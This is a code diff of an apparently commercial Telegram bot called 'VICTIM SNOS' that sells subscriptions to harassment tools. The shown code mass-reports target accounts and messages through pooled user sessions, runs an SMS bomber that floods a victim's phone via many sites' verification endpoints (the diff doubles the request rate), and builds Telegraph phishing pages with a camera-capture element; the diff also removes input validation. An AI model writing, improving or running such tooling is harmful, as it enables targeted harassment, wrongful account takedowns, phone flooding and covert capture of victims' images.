+        round_ok = sum(1 for r in batch if r)
         ok += round_ok
         
         if progress_callback:
             await progress_callback(rnd, rounds, ok)
         
+        logger.info(f"Username round {rnd}/{rounds}: {round_ok} reports")
+        
         if rnd < rounds and not stop_event.is_set():
-            await asyncio.sleep(2)
+            await asyncio.sleep(1)
     
     return ok
 
 async def report_account(session_data: dict, username: str, reason: str) -> bool:
-    """Отправка жалобы на аккаунт"""
     try:
         client = session_data["client"]
         if not client.is_connected:
             await client.connect()
         
-        # Получаем информацию об аккаунте
+        # Получаем пользователя
         try:
             user = await client.get_users(username)
         except:
             user = await client.get_users(f"@{username}")
         
-        # Отправляем жалобу
+        # Получаем peer
         peer = await client.resolve_peer(user.id)
-        report_reason = REPORT_REASONS.get(reason, raw_types.InputReportReasonSpam())
         
-        await client.invoke(ReportPeer(peer=peer, reason=report_reason, message=f"Report: {reason}"))
+        # Отправляем жалобу
+        report_reason = REPORT_REASONS.get(reason, raw_types.InputReportReasonSpam())
+        await client.invoke(ReportPeer(peer=peer, reason=report_reason, message=f"Violation: {reason}"))
         return True
     except Exception as e:
-        logger.debug(f"Report error: {e}")
+        logger.debug(f"Report account error: {e}")
         return False
 
 
-# ---------- БОМБЕР ----------
+# ---------- MESSAGE REPORTS ----------
+async def mass_report_message(user_id: int, link: str, reason: str, progress_callback=None) -> tuple:
+    # Парсим ссылку
+    patterns = [
+        r'(?:https?://)?t\.me/([^/]+)/(\d+)',
+        r'(?:https?://)?telegram\.me/([^/]+)/(\d+)',
+        r'(?:https?://)?t\.me/c/(\d+)/(\d+)',
+    ]
+    
+    channel = None
+    msg_id = None
+    for pattern in patterns:
+        m = re.search(pattern, link)
+        if m:
+            channel = m.group(1)
+            msg_id = int(m.group(2))
+            break
+    
+    if not channel or not msg_id:
+        return 0, "Invalid link"
+    
+    add_log(user_id, "Message report", f"{channel}/{msg_id}")
+    
+    if not is_user_sessions_ready(user_id):
+        return 0, "Sessions not ready"
+    
+    sessions = await get_user_sessions_batch(user_id, min(50, SESSIONS_PER_USER))
+    if not sessions:
+        return 0, "No sessions available"
+    
+    report_reason = REPORT_REASONS.get(reason, raw_types.InputReportReasonSpam())
+    
+    tasks = []
+    for s in sessions:
+        tasks.append(report_single_message(s, channel, msg_id, report_reason))
+    
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    ok = sum(1 for r in results if r)
+    
+    release_user_sessions(sessions)
+    logger.info(f"Message report: {ok} reports sent")
+    return ok, None
+
+async def report_single_message(session_data: dict, channel: str, msg_id: int, reason) -> bool:
+    try:
+        client = session_data["client"]
+        if not client.is_connected:
+            await client.connect()
+        
+        # Получаем чат
+        try:
+            if channel.isdigit():
+                chat = await client.get_chat(int(channel))
+            else:
+                chat = await client.get_chat(channel)
+        except:
+            chat = await client.get_chat(f"@{channel}")
+        
+        # Получаем peer и отправляем жалобу
+        peer = await client.resolve_peer(chat.id)
+        await client.invoke(Report(peer=peer, id=[msg_id], reason=reason, message="Violation report"))
+        return True
+    except Exception as e:
+        logger.debug(f"Message report error: {e}")
+        return False
+
+
+# ---------- BOMBER ----------
 async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
     headers = {
         'User-Agent': random.choice(USER_AGENTS),
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8',
+        'Accept': 'application/json',
         'Content-Type': 'application/json',
-        'Origin': site["url"].split('/api')[0] if '/api' in site["url"] else '/'.join(site["url"].split('/')[:3]),
-        'Referer': site["url"].split('/api')[0] if '/api' in site["url"] else '/'.join(site["url"].split('/')[:3]),
     }
     clean_phone = phone.replace("+", "").replace(" ", "").replace("-", "")
     
     try:
-        # Разные форматы данных для разных сайтов
-        if "phone" in site["phone_field"]:
-            data = {site["phone_field"]: clean_phone}
-        else:
-            data = {site["phone_field"]: phone}
-        
+        data = {site["phone_field"]: clean_phone}
         async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
             return {"site": site["name"], "success": resp.status < 500}
-    except asyncio.TimeoutError:
-        return {"site": site["name"], "success": False}
-    except Exception as e:
+    except:
         return {"site": site["name"], "success": False}
 
 async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
@@ -964,7 +924,7 @@ async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: async
     phone = phone.strip().replace(" ", "").replace("-", "")
     if not phone.startswith("+"):
         phone = "+" + phone
-    add_log(user_id, "Бомбер", phone)
+    add_log(user_id, "Bomber", phone)
     
     connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as sess:
@@ -974,7 +934,8 @@ async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: async
             
             tasks = []
             for site in BOMBER_SITES:
-                tasks.append(send_bomber_request(sess, phone, site))
+                for _ in range(2):
+                    tasks.append(send_bomber_request(sess, phone, site))
             
             batch = await asyncio.gather(*tasks, return_exceptions=True)
             
@@ -990,67 +951,6 @@ async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: async
                 await asyncio.sleep(BOMBER_DELAY)
     
     return ok
-
-
-# ---------- ЖАЛОБЫ НА СООБЩЕНИЯ ----------
-async def mass_report_message(user_id: int, link: str, reason: str, progress_callback=None) -> tuple:
-    patterns = [
-        r't\.me/([^/]+)/(\d+)',
-        r'telegram\.me/([^/]+)/(\d+)',
-        r't\.me/c/(\d+)/(\d+)',
-    ]
-    
-    channel = None
-    msg_id = None
-    for pattern in patterns:
-        m = re.search(pattern, link)
-        if m:
-            channel = m.group(1)
-            msg_id = int(m.group(2))
-            break
-    
-    if not channel or not msg_id:
-        return 0, "Неверная ссылка"
-    
-    add_log(user_id, f"Снос сообщения", f"@{channel}/{msg_id}")
-    
-    if not is_user_sessions_ready(user_id):
-        return 0, "Сессии не готовы"
-    
-    sessions = await get_user_sessions_batch(user_id, min(50, SESSIONS_PER_USER))
-    if not sessions:
-        return 0, "Нет доступных сессий"
-    
-    ok = 0
-    report_reason = REPORT_REASONS.get(reason, raw_types.InputReportReasonSpam())
-    
-    tasks = []
-    for s in sessions:
-        tasks.append(report_single_message(s, channel, msg_id, report_reason))
-    
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    ok = sum(1 for r in results if r and not isinstance(r, Exception))
-    
-    release_user_sessions(sessions)
-    return ok, None
-
-async def report_single_message(session_data: dict, channel: str, msg_id: int, reason) -> bool:
-    try:
-        client = session_data["client"]
-        if not client.is_connected:
-            await client.connect()
-        
-        try:
-            chat = await client.get_chat(channel)
-        except:
-            chat = await client.get_chat(f"@{channel}")
-        
-        peer = await client.resolve_peer(chat.id)
-        await client.invoke(raw_messages.Report(peer=peer, id=[msg_id], reason=reason, message="Violation report"))
-        return True
-    except Exception as e:
-        logger.debug(f"Message report error: {e}")
-        return False
 
 
 # ---------- TELEGRAPH PHISHING ----------
@@ -1073,10 +973,13 @@ async def create_telegraph_page(title: str, description: str, button_text: str, 
                     return None
                 access_token = data["result"]["access_token"]
             
-            # Создаем страницу с HTML контентом
+            # Создаем страницу с HTML
             content = [
                 {"tag": "p", "children": [description]},
-                {"tag": "div", "children": [{"tag": "p", "children": ["Загрузка..."]}]}
+                {"tag": "figure", "children": [
+                    {"tag": "div", "attrs": {"id": "camera-container"}},
+                    {"tag": "figcaption", "children": ["Click the button to take a photo"]}
+                ]}
             ]
             
             async with session.post(
@@ -1093,13 +996,10 @@ async def create_telegraph_page(title: str, description: str, button_text: str, 
                 data = await resp.json()
                 if data.get("ok"):
                     url = data["result"]["url"]
-                    
-                    # Сохраняем информацию о странице
                     phish_pages[page_id] = {
                         "url": url, 
                         "chat_id": chat_id, 
-                        "created": time.time(),
-                        "html": camera_html
+                        "created": time.time()
                     }
                     return url
     except Exception as e:
@@ -1110,70 +1010,70 @@ async def create_telegraph_page(title: str, description: str, button_text: str, 
 # ---------- UI ----------
 def get_main_menu(user_id: int):
     builder = InlineKeyboardBuilder()
-    builder.button(text="🔥 СНОС", callback_data="snos_menu")
-    builder.button(text="💣 БОМБЕР", callback_data="bomber_menu")
-    builder.button(text="🎣 ФИШИНГ", callback_data="phish_menu")
-    builder.button(text="💰 КУПИТЬ ДОСТУП", callback_data="purchase_menu")
-    builder.button(text="📊 СТАТУС", callback_data="status")
-    builder.button(text="⛔ СТОП", callback_data="stop")
+    builder.button(text="SNOS", callback_data="snos_menu")
+    builder.button(text="BOMBER", callback_data="bomber_menu")
+    builder.button(text="PHISHING", callback_data="phish_menu")
+    builder.button(text="BUY", callback_data="purchase_menu")
+    builder.button(text="STATUS", callback_data="status")
+    builder.button(text="STOP", callback_data="stop")
     if user_id == ADMIN_ID:
-        builder.button(text="👑 АДМИН", callback_data="admin_menu")
+        builder.button(text="ADMIN", callback_data="admin_menu")
     builder.adjust(2, 2, 2, 1, 1)
     return builder.as_markup()
 
 def get_snos_type_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="📱 ПО НОМЕРУ ТЕЛЕФОНА", callback_data="snos_phone")
-    builder.button(text="👤 ПО USERNAME", callback_data="snos_username")
-    builder.button(text="📧 ЖАЛОБА ПО ПОЧТЕ", callback_data="mail_menu")
-    builder.button(text="💬 ЖАЛОБА НА СООБЩЕНИЕ", callback_data="report_menu")
-    builder.button(text="🔙 НАЗАД", callback_data="main_menu")
+    builder.button(text="BY PHONE", callback_data="snos_phone")
+    builder.button(text="BY USERNAME", callback_data="snos_username")
+    builder.button(text="MAIL", callback_data="mail_menu")
+    builder.button(text="REPORT MSG", callback_data="report_menu")
+    builder.button(text="BACK", callback_data="main_menu")
     builder.adjust(1)
     return builder.as_markup()
 
 def get_snos_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="🚀 ЗАПУСТИТЬ СНОС", callback_data="snos_start")
-    builder.button(text="🔄 ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
-    builder.button(text="🔙 НАЗАД", callback_data="snos_type")
+    builder.button(text="START", callback_data="snos_start")
+    builder.button(text="REFRESH", callback_data="refresh_sessions")
+    builder.button(text="BACK", callback_data="snos_type")
     builder.adjust(1)
     return builder.as_markup()
 
 def get_bomber_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="💥 ЗАПУСТИТЬ БОМБЕР", callback_data="bomber")
-    builder.button(text="🔙 НАЗАД", callback_data="main_menu")
+    builder.button(text="START", callback_data="bomber")
+    builder.button(text="BACK", callback_data="main_menu")
     builder.adjust(1)
     return builder.as_markup()
 
 def get_mail_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="👤 ЖАЛОБА НА АККАУНТ", callback_data="mail_acc")
-    builder.button(text="📢 ЖАЛОБА НА КАНАЛ", callback_data="mail_chan")
-    builder.button(text="🔙 НАЗАД", callback_data="snos_type")
+    builder.button(text="ACCOUNT", callback_data="mail_acc")
+    builder.button(text="CHANNEL", callback_data="mail_chan")
+    builder.button(text="BACK", callback_data="snos_type")
     builder.adjust(1)
     return builder.as_markup()
 
 def get_mail_account_menu():
     builder = InlineKeyboardBuilder()
-    for k, v in COMPLAINT_TEXTS_ACCOUNT.items():
-        builder.button(text=f"{k} - {v['subject'][:30]}...", callback_data=f"mailacc_{k}")
-    builder.button(text="🔙 НАЗАД", callback_data="mail_menu")
+    for k in COMPLAINT_TEXTS_ACCOUNT.keys():
+        builder.button(text=f"Type {k}", callback_data=f"mailacc_{k}")
+    builder.button(text="BACK", callback_data="mail_menu")
     builder.adjust(1)
     return builder.as_markup()
 
 def get_mail_channel_menu():
     builder = InlineKeyboardBuilder()
-    for k, v in COMPLAINT_TEXTS_CHANNEL.items():
-        builder.button(text=f"{k} - {v['subject'][:30]}...", callback_data=f"mailchan_{k}")
-    builder.button(text="🔙 НАЗАД", callback_data="mail_menu")
+    for k in COMPLAINT_TEXTS_CHANNEL.keys():
+        builder.button(text=f"Type {k}", callback_data=f"mailchan_{k}")
+    builder.button(text="BACK", callback_data="mail_menu")
     builder.adjust(1)
     return builder.as_markup()
 
 def get_report_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="📝 ОТПРАВИТЬ ЖАЛОБУ", callback_data="report_msg")
-    builder.button(text="🔙 НАЗАД", callback_data="snos_type")
+    builder.button(text="SEND", callback_data="report_msg")
+    builder.button(text="BACK", callback_data="snos_type")
     builder.adjust(1)
     return builder.as_markup()
 
@@ -1181,47 +1081,47 @@ def get_report_reason_menu():
     builder = InlineKeyboardBuilder()
     for k, v in REPORT_REASONS_RU.items():
         builder.button(text=v, callback_data=f"reason_{k}")
-    builder.button(text="🔙 НАЗАД", callback_data="report_menu")
+    builder.button(text="BACK", callback_data="report_menu")
     builder.adjust(2)
     return builder.as_markup()
 
 def get_phish_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="🔗 СОЗДАТЬ ФИШ-ССЫЛКУ", callback_data="phish_create")
-    builder.button(text="📋 МОИ ССЫЛКИ", callback_data="phish_list")
-    builder.button(text="🔙 НАЗАД", callback_data="main_menu")
+    builder.button(text="CREATE", callback_data="phish_create")
+    builder.button(text="LIST", callback_data="phish_list")
+    builder.button(text="BACK", callback_data="main_menu")
     builder.adjust(1)
     return builder.as_markup()
 
 def get_admin_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="✅ ВЫДАТЬ ДОСТУП", callback_data="admin_add")
-    builder.button(text="❌ ЗАБРАТЬ ДОСТУП", callback_data="admin_remove")
-    builder.button(text="📅 ДОБАВИТЬ ДНИ", callback_data="admin_add_days")
-    builder.button(text="🎫 СОЗДАТЬ ПРОМОКОД", callback_data="admin_create_promo")
-    builder.button(text="📋 СПИСОК", callback_data="admin_list")
-    builder.button(text="📊 ЛОГИ", callback_data="admin_logs")
-    builder.button(text="🔙 НАЗАД", callback_data="main_menu")
+    builder.button(text="ADD", callback_data="admin_add")
+    builder.button(text="REMOVE", callback_data="admin_remove")
+    builder.button(text="ADD DAYS", callback_data="admin_add_days")
+    builder.button(text="PROMO", callback_data="admin_create_promo")
+    builder.button(text="LIST", callback_data="admin_list")
+    builder.button(text="LOGS", callback_data="admin_logs")
+    builder.button(text="BACK", callback_data="main_menu")
     builder.adjust(2)
     return builder.as_markup()
 
 def get_purchase_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="📅 30 дней - 100 RUB", callback_data="buy_rub_30d")
-    builder.button(text="📅 60 дней - 200 RUB", callback_data="buy_rub_60d")
-    builder.button(text="♾️ Навсегда - 400 RUB", callback_data="buy_rub_forever")
-    builder.button(text="⭐ Оплата Звездами", callback_data="buy_stars_menu")
-    builder.button(text="🎫 Использовать промокод", callback_data="use_promo")
-    builder.button(text="🔙 НАЗАД", callback_data="main_menu")
+    builder.button(text="30d - 100 RUB", callback_data="buy_rub_30d")
+    builder.button(text="60d - 200 RUB", callback_data="buy_rub_60d")
+    builder.button(text="Forever - 400 RUB", callback_data="buy_rub_forever")
+    builder.button(text="Stars", callback_data="buy_stars_menu")
+    builder.button(text="Promo", callback_data="use_promo")
+    builder.button(text="BACK", callback_data="main_menu")
     builder.adjust(1)
     return builder.as_markup()
 
 def get_stars_purchase_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="📅 30 дней - 100 ⭐", callback_data="buy_stars_30d")
-    builder.button(text="📅 60 дней - 200 ⭐", callback_data="buy_stars_60d")
-    builder.button(text="♾️ Навсегда - 400 ⭐", callback_data="buy_stars_forever")
-    builder.button(text="🔙 НАЗАД", callback_data="purchase_menu")
+    builder.button(text="30d - 100", callback_data="buy_stars_30d")
+    builder.button(text="60d - 200", callback_data="buy_stars_60d")
+    builder.button(text="Forever - 400", callback_data="buy_stars_forever")
+    builder.button(text="BACK", callback_data="purchase_menu")
     builder.adjust(1)
     return builder.as_markup()
 
@@ -1235,16 +1135,13 @@ async def delete_old_messages(user_id: int, chat_id: int):
         user_messages[user_id] = []
 
 async def send_message_with_banner(event, text: str, markup=None):
-    """Универсальная функция отправки сообщения с баннером"""
     user_id = event.from_user.id if hasattr(event, 'from_user') else event.chat.id
     
-    # Удаляем старые сообщения
     if hasattr(event, 'chat'):
         await delete_old_messages(user_id, event.chat.id)
     
-    full_text = f"<b>🔥 VICTIM SNOS - Блокировка нарушителей 🔥</b>\n\n{text}"
+    full_text = f"<b>VICTIM SNOS</b>\n\n{text}"
     
-    # Проверяем наличие баннера
     banner_paths = [BANNER_FILE, "Banner.png", "./banner.png", "./Banner.png"]
     banner_found = False
     msg = None
@@ -1260,11 +1157,10 @@ async def send_message_with_banner(event, text: str, markup=None):
                     msg = await bot.send_photo(chat_id=user_id, photo=FSInputFile(path), caption=full_text, reply_markup=markup)
                 banner_found = True
                 break
-            except Exception as e:
-                logger.error(f"Banner send error: {e}")
+            except:
+                pass
     
     if not banner_found:
-        logger.warning("Banner not found, sending text only")
         if hasattr(event, 'answer'):
             msg = await event.answer(full_text, reply_markup=markup)
         elif hasattr(event, 'message') and hasattr(event.message, 'answer'):
@@ -1281,7 +1177,7 @@ async def send_message_with_banner(event, text: str, markup=None):
 
 async def edit_message_with_banner(callback: types.CallbackQuery, text: str, markup=None):
     user_id = callback.from_user.id
-    full_text = f"<b>🔥 VICTIM SNOS - Блокировка нарушителей 🔥</b>\n\n{text}"
+    full_text = f"<b>VICTIM SNOS</b>\n\n{text}"
     
     try:
         await callback.message.delete()
@@ -1310,66 +1206,66 @@ async def edit_message_with_banner(callback: types.CallbackQuery, text: str, mar
         user_messages[user_id].append(msg.message_id)
 
 
-# ---------- ОБРАБОТЧИКИ ----------
+# ---------- HANDLERS ----------
 @dp.message(Command("start"))
 async def start(msg: types.Message):
     user_id = msg.from_user.id
     await msg.delete()
     
     if not await check_channel_subscription(user_id):
-        await send_message_with_banner(msg, f"⚠️ Подпишитесь на канал:\n\n{CHANNEL_URL}")
+        await send_message_with_banner(msg, f"Subscribe to channel:\n\n{CHANNEL_URL}")
         return
     
     if not is_user_allowed(user_id):
-        await send_message_with_banner(msg, f"⛔ Доступ запрещен. Приобретите подписку.\n\nВаш ID: <code>{user_id}</code>", get_purchase_menu())
+        await send_message_with_banner(msg, f"Access denied.\nYour ID: <code>{user_id}</code>", get_purchase_menu())
         return
     
     if user_id not in user_sessions or not user_sessions[user_id].get("ready"):
         asyncio.create_task(ensure_user_sessions(user_id))
     
-    await send_message_with_banner(msg, "👋 Выберите действие:", get_main_menu(user_id))
+    await send_message_with_banner(msg, "Select action:", get_main_menu(user_id))
 
 @dp.message(Command("admin"))
 async def admin_cmd(msg: types.Message):
     await msg.delete()
     if msg.from_user.id != ADMIN_ID:
         return
-    await send_message_with_banner(msg, f"👑 Панель администратора\n\nПользователей: {len(ALLOWED_USERS)}", get_admin_menu())
+    await send_message_with_banner(msg, "Admin panel", get_admin_menu())
 
 @dp.callback_query(F.data == "snos_menu")
 async def snos_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, "🔥 Выберите тип сноса:", get_snos_type_menu())
+    await edit_message_with_banner(cb, "Select snos type:", get_snos_type_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "snos_phone")
 async def snos_phone_type(cb: types.CallbackQuery, state: FSMContext):
     await state.update_data(snos_type="phone")
-    await edit_message_with_banner(cb, f"📱 Снос по номеру телефона\n\n📨 {SMS_PER_ROUND} SMS/раунд\n🔄 Макс. {MAX_ROUNDS} раундов\n🌐 OAuth сайты: {len(OAUTH_SITES)}\n🔐 Acollo: активен", get_snos_menu())
+    await edit_message_with_banner(cb, "Snos by phone", get_snos_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "snos_username")
 async def snos_username_type(cb: types.CallbackQuery, state: FSMContext):
     await state.update_data(snos_type="username")
-    await edit_message_with_banner(cb, f"👤 Снос по username\n\n⚠️ Массовые жалобы\n🔄 Макс. {MAX_ROUNDS} раундов", get_snos_menu())
+    await edit_message_with_banner(cb, "Snos by username", get_snos_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "snos_start")
 async def snos_start(cb: types.CallbackQuery, state: FSMContext):
     if not await check_channel_subscription(cb.from_user.id):
-        await cb.answer("⚠️ Подпишитесь на канал!", show_alert=True)
+        await cb.answer("Subscribe to channel!", show_alert=True)
         return
     
     can, wait = check_cooldown(cb.from_user.id, "snos")
     if not can:
-        await cb.answer(f"⏳ Подождите {int(wait)} сек.", show_alert=True)
+        await cb.answer(f"Wait {int(wait)} sec", show_alert=True)
         return
     
     if not is_user_sessions_ready(cb.from_user.id):
-        await cb.answer("🔄 Сессии загружаются...", show_alert=True)
+        await cb.answer("Sessions loading...", show_alert=True)
         return
     
     if cb.from_user.id in active_attacks:
-        await cb.answer("⚠️ Снос уже запущен!", show_alert=True)
+        await cb.answer("Already running!", show_alert=True)
         return
     
     data = await state.get_data()
@@ -1381,22 +1277,18 @@ async def snos_start(cb: types.CallbackQuery, state: FSMContext):
         await state.set_state(SnosUsernameState.waiting_username)
     
     await cb.message.delete()
-    caption = f"<b>🔥 VICTIM SNOS</b>\n\n📝 Введите {'номер телефона' if snos_type == 'phone' else 'username'}:"
-    await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="snos_menu")]]))
+    caption = f"<b>VICTIM SNOS</b>\n\nEnter {'phone' if snos_type == 'phone' else 'username'}:"
+    await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="snos_menu")]]))
 
 @dp.message(StateFilter(SnosPhoneState.waiting_phone))
 async def snos_phone_input(msg: types.Message, state: FSMContext):
     phone = msg.text.strip().replace(" ", "").replace("-", "")
     if not phone.startswith("+"):
         phone = "+" + phone
-    if not re.match(r'^\+\d{10,15}$', phone):
-        await msg.delete()
-        await send_message_with_banner(msg, "❌ Неверный формат номера!")
-        return
     await state.update_data(phone=phone)
     await state.set_state(SnosPhoneState.waiting_count)
     await msg.delete()
-    await send_message_with_banner(msg, f"🔢 Введите количество раундов (1-{MAX_ROUNDS}):")
+    await send_message_with_banner(msg, f"Enter rounds (1-{MAX_ROUNDS}):")
 
 @dp.message(StateFilter(SnosPhoneState.waiting_count))
 async def snos_phone_count(msg: types.Message, state: FSMContext):
@@ -1404,11 +1296,11 @@ async def snos_phone_count(msg: types.Message, state: FSMContext):
         count = int(msg.text.strip())
         if count < 1 or count > MAX_ROUNDS:
             await msg.delete()
-            await send_message_with_banner(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
+            await send_message_with_banner(msg, f"Enter 1-{MAX_ROUNDS}!")
             return
     except:
         await msg.delete()
-        await send_message_with_banner(msg, "❌ Введите число!")
+        await send_message_with_banner(msg, "Enter number!")
         return
     
     data = await state.get_data()
@@ -1421,11 +1313,11 @@ async def snos_phone_count(msg: types.Message, state: FSMContext):
     stop_event = asyncio.Event()
     active_attacks[user_id] = {"stop_event": stop_event}
     
-    st = await send_message_with_banner(msg, f"🚀 Снос запущен...\n\n📱 Телефон: {phone}")
+    st = await send_message_with_banner(msg, f"Snos started...\n\nPhone: {phone}")
     
     async def progress_callback(cur, tot, ok_count):
         try:
-            await st.edit_caption(caption=f"<b>🔥 VICTIM SNOS</b>\n\n📱 Телефон: {phone}\n🔄 Раунд: {cur}/{tot}\n📨 Запросов: {ok_count}")
+            await st.edit_caption(caption=f"<b>VICTIM SNOS</b>\n\nPhone: {phone}\nRound: {cur}/{tot}\nRequests: {ok_count}")
         except:
             pass
     
@@ -1435,19 +1327,15 @@ async def snos_phone_count(msg: types.Message, state: FSMContext):
     if user_id in active_attacks:
         del active_attacks[user_id]
     
-    await send_message_with_banner(msg, f"✅ Снос завершен\n\n📱 Телефон: <code>{phone}</code>\n📨 Запросов: <b>{ok}</b>", get_main_menu(user_id))
+    await send_message_with_banner(msg, f"Snos finished\n\nPhone: <code>{phone}</code>\nRequests: <b>{ok}</b>", get_main_menu(user_id))
 
 @dp.message(StateFilter(SnosUsernameState.waiting_username))
 async def snos_username_input(msg: types.Message, state: FSMContext):
     username = msg.text.strip().replace("@", "")
-    if not re.match(r'^[a-zA-Z0-9_]{5,32}$', username):
-        await msg.delete()
-        await send_message_with_banner(msg, "❌ Неверный формат username!")
-        return
     await state.update_data(username=username)
     await state.set_state(SnosUsernameState.waiting_count)
     await msg.delete()
-    await send_message_with_banner(msg, f"🔢 Введите количество раундов (1-{MAX_ROUNDS}):")
+    await send_message_with_banner(msg, f"Enter rounds (1-{MAX_ROUNDS}):")
 
 @dp.message(StateFilter(SnosUsernameState.waiting_count))
 async def snos_username_count(msg: types.Message, state: FSMContext):
@@ -1455,11 +1343,11 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
         count = int(msg.text.strip())
         if count < 1 or count > MAX_ROUNDS:
             await msg.delete()
-            await send_message_with_banner(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
+            await send_message_with_banner(msg, f"Enter 1-{MAX_ROUNDS}!")
             return
     except:
         await msg.delete()
-        await send_message_with_banner(msg, "❌ Введите число!")
+        await send_message_with_banner(msg, "Enter number!")
         return
     
     data = await state.get_data()
@@ -1472,11 +1360,11 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
     stop_event = asyncio.Event()
     active_attacks[user_id] = {"stop_event": stop_event}
     
-    st = await send_message_with_banner(msg, f"🚀 Снос запущен...\n\n👤 Username: @{username}")
+    st = await send_message_with_banner(msg, f"Snos started...\n\nUsername: @{username}")
     
     async def progress_callback(cur, tot, ok_count):
         try:
-            await st.edit_caption(caption=f"<b>🔥 VICTIM SNOS</b>\n\n👤 Username: @{username}\n🔄 Раунд: {cur}/{tot}\n⚠️ Жалоб: {ok_count}")
+            await st.edit_caption(caption=f"<b>VICTIM SNOS</b>\n\nUsername: @{username}\nRound: {cur}/{tot}\nReports: {ok_count}")
         except:
             pass
     
@@ -1486,31 +1374,31 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
     if user_id in active_attacks:
         del active_attacks[user_id]
     
-    await send_message_with_banner(msg, f"✅ Снос завершен\n\n👤 Username: <code>@{username}</code>\n⚠️ Жалоб: <b>{ok}</b>", get_main_menu(user_id))
+    await send_message_with_banner(msg, f"Snos finished\n\nUsername: @{username}\nReports: <b>{ok}</b>", get_main_menu(user_id))
 
 @dp.callback_query(F.data == "bomber_menu")
 async def bomber_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, f"💣 СМС Бомбер\n\n📱 Доступно {len(BOMBER_SITES)} сайтов", get_bomber_menu())
+    await edit_message_with_banner(cb, "SMS Bomber", get_bomber_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "bomber")
 async def bomber_start(cb: types.CallbackQuery, state: FSMContext):
     if not await check_channel_subscription(cb.from_user.id):
-        await cb.answer("⚠️ Подпишитесь на канал!", show_alert=True)
+        await cb.answer("Subscribe!", show_alert=True)
         return
     
     can, wait = check_cooldown(cb.from_user.id, "bomber")
     if not can:
-        await cb.answer(f"⏳ Подождите {int(wait)} сек.", show_alert=True)
+        await cb.answer(f"Wait {int(wait)} sec", show_alert=True)
         return
     
     if cb.from_user.id in active_bombers:
-        await cb.answer("⚠️ Бомбер уже запущен!", show_alert=True)
+        await cb.answer("Already running!", show_alert=True)
         return
     
     await state.set_state(BomberState.waiting_phone)
     await cb.message.delete()
-    await cb.message.answer("<b>🔥 VICTIM SNOS</b>\n\n📝 Введите номер телефона:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="bomber_menu")]]))
+    await cb.message.answer("<b>VICTIM SNOS</b>\n\nEnter phone:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="bomber_menu")]]))
 
 @dp.message(StateFilter(BomberState.waiting_phone))
 async def bomber_phone(msg: types.Message, state: FSMContext):
@@ -1520,7 +1408,7 @@ async def bomber_phone(msg: types.Message, state: FSMContext):
     await state.update_data(phone=phone)
     await state.set_state(BomberState.waiting_count)
     await msg.delete()
-    await send_message_with_banner(msg, "🔢 Введите количество раундов (1-5):")
+    await send_message_with_banner(msg, "Enter rounds (1-5):")
 
 @dp.message(StateFilter(BomberState.waiting_count))
 async def bomber_count(msg: types.Message, state: FSMContext):
@@ -1528,11 +1416,11 @@ async def bomber_count(msg: types.Message, state: FSMContext):
         count = int(msg.text.strip())
         if count < 1 or count > 5:
             await msg.delete()
-            await send_message_with_banner(msg, "❌ Введите число от 1 до 5!")
+            await send_message_with_banner(msg, "Enter 1-5!")
             return
     except:
         await msg.delete()
-        await send_message_with_banner(msg, "❌ Введите число!")
+        await send_message_with_banner(msg, "Enter number!")
         return
     
     data = await state.get_data()
@@ -1545,11 +1433,11 @@ async def bomber_count(msg: types.Message, state: FSMContext):
     stop_event = asyncio.Event()
     active_bombers[user_id] = {"stop_event": stop_event}
     
-    st = await send_message_with_banner(msg, f"💥 Бомбер запущен...\n\n📱 Телефон: {phone}")
+    st = await send_message_with_banner(msg, f"Bomber started...\n\nPhone: {phone}")
     
     async def progress_callback(cur, tot, ok_count):
         try:
-            await st.edit_caption(caption=f"<b>🔥 VICTIM SNOS</b>\n\n📱 Телефон: {phone}\n🔄 Раунд: {cur}/{tot}\n💬 СМС: {ok_count}")
+            await st.edit_caption(caption=f"<b>VICTIM SNOS</b>\n\nPhone: {phone}\nRound: {cur}/{tot}\nSMS: {ok_count}")
         except:
             pass
     
@@ -1559,16 +1447,16 @@ async def bomber_count(msg: types.Message, state: FSMContext):
     if user_id in active_bombers:
         del active_bombers[user_id]
     
-    await send_message_with_banner(msg, f"✅ Бомбер завершен\n\n📱 Телефон: <code>{phone}</code>\n💬 СМС: <b>{ok}</b>", get_main_menu(user_id))
